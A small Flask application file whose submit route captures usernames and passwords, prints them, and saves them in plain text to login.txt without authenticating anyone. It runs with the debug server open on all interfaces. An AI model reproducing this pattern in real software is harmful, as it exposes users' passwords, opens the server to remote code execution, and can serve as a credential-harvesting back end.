# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Get the form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    # For now, let's just print it (you could process it here)
    print(f"Received username: {username}")
    print(f"Received password: {password}")

    with open("login.txt", "w") as fl:
        fl.write(f"Received username: {username}\n")
        fl.write(f"Received password: {password}")
    
    return "Login submitted successfully!"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
